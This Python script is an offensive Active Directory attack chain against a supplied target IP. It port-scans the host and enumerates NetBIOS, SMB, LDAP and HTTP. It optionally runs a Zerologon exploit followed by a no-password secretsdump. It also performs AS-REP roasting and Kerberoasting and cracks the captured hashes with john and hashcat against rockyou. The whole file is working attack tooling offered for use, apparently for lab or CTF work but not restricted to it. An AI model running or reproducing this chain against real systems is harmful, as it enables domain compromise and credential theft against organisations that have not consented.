import re
import socket
import sys
import threading
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

from colorama import Fore, Style, init
import pyfiglet

### INIT COLOR ###
init(autoreset=True)

### BANNER ###
logo = pyfiglet.figlet_format("shimada", font="standard").rstrip()
colored_logo = f"{Style.BRIGHT}{Fore.LIGHTWHITE_EX}{logo}"

katana_ascii = f"""{Style.BRIGHT}{Fore.LIGHTGREEN_EX}
           />_______________________________
[########[]_________________________________/
           \殺>
{Style.RESET_ALL}
"""

print(colored_logo)
print(katana_ascii)

### PORT CONFIG ###
port_range = range(0, 65536)
common_ports = {
    20:  "ftp-data",
    21:  "ftp",
    22:  "ssh",
    23:  "telnet",
    25:  "smtp",
    53:  "dns",
    67:  "dhcp-server",
    68:  "dhcp-client",
    80:  "http",
    88:  "kerberos",
    110: "pop3",
    111: "rpcbind",
    123: "ntp",
    135: "rpc",
    139: "netbios",
    143: "imap",
    161: "snmp",
    389: "ldap",
    443: "https",
    445: "smb",
    636: "ldaps",
    873: "rsync",
    993: "imap-ssl",
    995: "pop3-ssl",
    1433: "mssql",
    3306: "mysql",
    3389: "rdp",
    5432: "postgres",
    5985: "winrm",
}

open_ports = []
domain_name = None

### PORT ENUM ###
def port_scan(target_ip, port_range):
    print(f"{Fore.LIGHTGREEN_EX}###### PORT SCAN ######{Style.RESET_ALL}")
    max_threads = 200
    timeout = 0.3
    print_lock = threading.Lock()

    def scan_thread(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            status = s.connect_ex((target_ip, port))
            s.close()

            if status == 0:
                try:
                    service_name = socket.getservbyport(port)
                    service_name = common_ports.get(port, service_name)
                except OSError:
                    service_name = "unknown"

                with print_lock:
                    sys.stdout.write(f"{Fore.YELLOW}[*] {port:<5} open  →  {service_name}{Style.RESET_ALL}\n")
                    sys.stdout.flush()
                open_ports.append(port)
        except socket.error:
            pass
        return open_ports

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(scan_thread, port): port for port in port_range}
        for future in as_completed(futures):
            future.result()

def netbios_scan(target_ip):
    cmd = ["nbtscan", target_ip]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        output = result.stdout
        lines = output.splitlines()
        line_4 = lines[4]
        parts = line_4.split()
        netbios_name = parts[1]
        return netbios_name

    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] NBT Scan Failed.{Style.RESET_ALL}")


def zerologon(netbios_name):
    global target_ip

    cmd = ["python3", "cve-2020-1472-exploit.py", netbios_name, target_ip]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        print(result.stdout)
        if "SUCCESS" in result.stdout.upper() or "Password reset" in result.stdout:
            print(f"{Fore.YELLOW}[+] Zerologon succeeded! Running secretsdump...{Fore.RESET}")
            zerologon_secretsdump()
        else:
            print(f"{Fore.RED}[!] Zerologon exploit failed.{Fore.RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}[!] Zerologon exploit failed:{Fore.RESET}\n{e.stdout}\n{e.stderr}")

def zerologon_secretsdump():
    global domain_name
    cmd = ["python3", "/usr/share/doc/python3-impacket/examples/secretsdump.py", f"{domain_name}/{netbios_name}$@{target_ip}", "-no-pass"]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}[!] Secretsdump failed:{Fore.RESET}\n{e.stdout}\n{e.stderr}")



### ENUM4LINUX ###
def enum4linux(netbios_name):
    print(f"\n{Fore.LIGHTGREEN_EX}###### DOMAIN NAME ######{Style.RESET_ALL}")
    global domain_name
    tlds = ['.com', '.net', '.org', '.local', '.lan', '.corp', '.int', '.edu']
    cmd = ["enum4linux", "-a", target_ip]

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=True)
        output = result.stdout
        with open("enum4linux.txt", 'w') as f:
            f.write(output)
        base = None
        for line in output.splitlines():
            if "Domain Name:" in line:
                base = line.split(":", 1)[1].strip()
                break
        if not base:
            print(f"{Fore.RED}[!] Domain name not found in enum4linux output.{Style.RESET_ALL}")
            return
        for tld in tlds:
            domain = base + tld
            try:
                ip = socket.gethostbyname(domain)
                if ip == target_ip:
                    domain_name = domain.upper()
                    break
            except socket.gaierror:
                continue
        if domain_name:
            print(f"{Fore.YELLOW}[+] {domain_name}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[+] {netbios_name}{Style.RESET_ALL}")

        else:
            print(f"{Fore.RED}[!] No resolvable domain for base '{base}'{Style.RESET_ALL}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] Enum4Linux command failed{Style.RESET_ALL}")

### LDAP ENUM ###
def ldap_scan(target_ip):
    global domain_name
    DC_parts = domain_name.split('.')
    base_dn = ",".join(f"DC={part}" for part in DC_parts)
    cmd = ["ldapsearch", "-H", f"ldap://{target_ip}", "-x", "-b", base_dn]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=True)
        output = result.stdout
        print(f"{Fore.YELLOW}[*] LDAP scan results saves to: {Fore.CYAN}ldapsearch.txt{Style.RESET_ALL}")
        with open("ldapsearch.txt", 'w') as f:
            f.write(output)
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] LDAP search failed{Style.RESET_ALL}")
        return None

def ldap_users():
    cmd = "grep -i '^sAMAccountName:' ldapsearch.txt | awk '{print $2}' > users.txt"
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, shell=True)
        output = result.stdout.decode('utf-8')
        print(f"{Fore.YELLOW}[*] LDAP user enumeration results saved to: {Fore.CYAN}users.txt{Style.RESET_ALL}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] LDAP sorting error{Style.RESET_ALL}")

def ldap_description():
    cmd = "grep -i '^description:' ldapsearch.txt > ldap_description.txt"
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, shell=True)
        output = result.stdout.decode('utf-8')
        print(f"{Fore.YELLOW}[*] LDAP description saved to: {Fore.CYAN}ldap_description.txt{Style.RESET_ALL}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] LDAP sorting error{Style.RESET_ALL}")

### SMB ENUM ###
def smb_share_scan():
    smbmap_cmd = ["smbmap", "-u", "anonymous", "-H", target_ip]
    try:
        result = subprocess.run(smbmap_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, timeout=5, check=True)
        output = result.stdout
        clean_output = []
        capture = False
        for line in output.splitlines():
            if line.strip().startswith("[+] IP"):
                capture = True
            elif "Closing connections.." in line and capture:
                break
            if capture:
                clean_output.append(line)
        clean_output = "\n".join(clean_output).strip()
        print(f"{Fore.YELLOW}{clean_output}{Style.RESET_ALL}")
        with open("smb_scan.txt", "w") as f:
            f.write(clean_output)
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] SMBmap Enumeration Failed{Style.RESET_ALL}")

### HTTP/HTTPS ENUMERATION ###
def run_feroxbuster(target_ip, port):
    url = f"http://{target_ip}/" if port == 80 else f"https://{target_ip}/"
    wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    output_file = "feroxbuster.txt"
    ferox_cmd = [
        "feroxbuster",
        "-u", url,
        "-w", wordlist,
        "-t", "100",
        "-r",
        "-e",
        "-x", "php,html,js,json,txt",
        "-s", "200,204,301,302,307,403,401",
        "-o", output_file
    ]
    try:
        subprocess.run(ferox_cmd, check=True, stdout=sys.stdout, stderr=sys.stderr)
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] Feroxbuster failed on {url}{Style.RESET_ALL}")

### KERBEROS ENUM ###
def run_kerberos_enum(target_ip):
    cmd = ["impacket-GetNPUsers", f"{domain_name}/", "-usersfile", "users.txt", "-no-pass", "-dc-ip", target_ip, "-outputfile", "asrep.txt"]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=True)
        output = result.stdout
        with open("kerberos.txt", "w") as f:
            f.write(output)
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] Kerberos enumeration Failed{Style.RESET_ALL}")

def filter_asrep_users():
    hashes = []
    with open("kerberos.txt", 'r') as f:
        for line in f:
            if f'@{domain_name}'.lower() in line.lower():
                hashes.append(line)
    if len(hashes) > 0:
        with open("asrep_hashes.txt", "w") as f:
            for line in hashes:
                f.write(line)
        crack_asrep_hash()
    else:
        print(f"{Fore.RED}No Vulnerable account hashes found{Style.RESET_ALL}")
        return

def crack_asrep_hash():
    cmd = ["john", "--format=krb5asrep", "--wordlist=/usr/share/wordlists/rockyou.txt", "asrep_hashes.txt"]
    john_cmd = ["john", "--show", "--format=krb5asrep", "asrep_hashes.txt"]
    try:
        subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=True)
        result = subprocess.run(john_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=True)
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] Cracking ASREP Hash Failed{Style.RESET_ALL}")

    cracked_lines = [ln for ln in result.stdout.splitlines() if ':' in ln and not ln.startswith(("[", "Remaining"))]
    if cracked_lines:
        print(f"{Fore.YELLOW}{result.stdout}{Style.RESET_ALL}")
        with open("asrep_cracked.txt", "w") as f:
            f.write(result.stdout)
        print(f"\n{Fore.YELLOW}[*] Results saved to: {Fore.CYAN}asrep_cracked.txt{Style.RESET_ALL}")
    else:
        pass


def find_vuln_accounts():
    global domain_name
    print(f"{Fore.LIGHTGREEN_EX}###### FINDING OTHER VULNERABLE ACCOUNTS ######{Style.RESET_ALL}")
    with open("asrep_cracked.txt", "r") as f:
        usernames = []
        passwords = []
        vuln_accounts = []
        for line in f:
            line = line.strip()
            if line.startswith("$"):
                username = line.split("$")[-1].split("@")[0]
                usernames.append(username)
                hash_part = line.split(":")[-1]
                passwords.append(hash_part)
        for username, password in zip(usernames, passwords):
            cmd = ["impacket-GetUserSPNs", "-dc-ip", target_ip, f"{domain_name}/{username}:{password}", "-request"]
            try:
                print(f"{Fore.YELLOW}Attempting with credentials: {Fore.CYAN}{username}:{password}{Style.RESET_ALL}")
                result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=True)
                vuln_accounts.append(result.stdout.strip())
            except subprocess.CalledProcessError:
                print(f"[!] Failed for {username}")
        with open("vuln_accounts.txt", "w") as f:
            f.write('\n'.join(vuln_accounts) + '\n')
        print(f"{Fore.YELLOW}[*] Vulnerable accounts found and saved to: {Fore.CYAN}vuln_accounts.txt{Style.RESET_ALL}")

def crack_vuln_accounts():
    print(f"{Fore.LIGHTGREEN_EX}###### ATTEMPTING PASSWORD CRACKING ######{Style.RESET_ALL}")
    cmd1 = ["hashcat", "-m", "13100", "-a", "0", "vuln_account_hashes.txt", "/usr/share/wordlists/rockyou.txt", "--force"]
    cmd2 = ["hashcat", "-m", "13100", "vuln_account_hashes.txt", "--show"]
    with open("vuln_accounts.txt", "r") as f:
        username = []
        for line in f:
            line = line.strip()
            if line.startswith("$"):
                username.append(line)
    with open("vuln_account_hashes.txt", "w") as f:
        f.write('\n'.join(username) + '\n')
    try:
        subprocess.run(cmd1, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        result = subprocess.run(cmd2, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        print(result.stdout)
        with open("vuln_passwords.txt", "w") as f:
            f.write(result.stdout)
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[!] Unable to crack other vulnerable account hashes{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Password hashes saved to: {Fore.CYAN}vuln_passwords.txt{Style.RESET_ALL}")



        ### MAIN ###
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"{Fore.RED}Usage: python3 vuln_scan.py <target_ip>{Style.RESET_ALL}")
        sys.exit(1)
    target_ip = sys.argv[1]
    port_scan(target_ip, port_range)
    netbios_name = netbios_scan(target_ip)
    enum4linux(netbios_name)

    if 139 in open_ports:
        print(f"\n{Fore.LIGHTGREEN_EX}###### ZEROLOGON ######{Fore.RESET}")
        while True:
            choice = input(f"{Fore.MAGENTA}Do you want to run Zerologon Exploit [y/n] {Style.RESET_ALL}")
            if choice.lower() == "y":
                zerologon(netbios_name)
                break
            elif choice.lower() == "n":
                break
            else:
                print("[!] Invalid Choice!")

    if 80 in open_ports:
        print(f"{Fore.LIGHTGREEN_EX}###### FEROXBUSTER ######{Style.RESET_ALL}")
        while True:
            choice = input(f"{Fore.MAGENTA}Do you want to run Feroxbuster on port 80? [y/n] {Style.RESET_ALL}")
            if choice.lower() == "y":
                run_feroxbuster(target_ip, 80)
                break
            elif choice.lower() == "n":
                break
            else:
                print("[!] Invalid Choice!")

    if 445 in open_ports:
        print(f"{Fore.LIGHTGREEN_EX}###### SMB SHARE SCAN ######{Style.RESET_ALL}")
        while True:
            choice = input(f"{Fore.MAGENTA}Do you want to run SMB enumeration on port 445? [y/n] {Style.RESET_ALL}")
            if choice.lower() == "y":
                smb_share_scan()
                break
            elif choice.lower() == "n":
                break
            else:
                print("[!] Invalid Choice!")

    if 389 in open_ports:
        print(f"{Fore.LIGHTGREEN_EX}###### LDAP ENUM ######{Style.RESET_ALL}")
        while True:
            choice = input(f"{Fore.MAGENTA}Do you want to run LDAP enumeration on port 389? [y/n] {Style.RESET_ALL}")
            if choice.lower() == "y":
                ldap_scan(target_ip)
                ldap_users()
                ldap_description()
                break
            elif choice.lower() == "n":
                break
            else:
                print("[!] Invalid Choice!")

    if 88 in open_ports:
        print(f"{Fore.LIGHTGREEN_EX}###### KERBEROS ENUM ######{Style.RESET_ALL}")
        while True:
            choice = input(f"{Fore.MAGENTA}Do you want to run Kerberos enumeration on port 88? [y/n] {Style.RESET_ALL}")
            if choice.lower() == "y":
                run_kerberos_enum(target_ip)
                filter_asrep_users()
                try:
                    with open("asrep_cracked.txt", "r") as f:
                        content = f.read().strip()
                        if content:
                            find_vuln_accounts()
                            crack_vuln_accounts()
                        else:
                            print(
                                f"{Fore.RED}[!] No credentials found via AS-REP roasting. Skipping vulnerable account check.{Style.RESET_ALL}")
                except FileNotFoundError:
                    print(
                        f"{Fore.RED}[!] asrep_cracked.txt not found. Skipping vulnerable account check.{Style.RESET_ALL}")
                break
            elif choice.lower() == "n":
                break
            else:
                print("[!] Invalid Choice!")

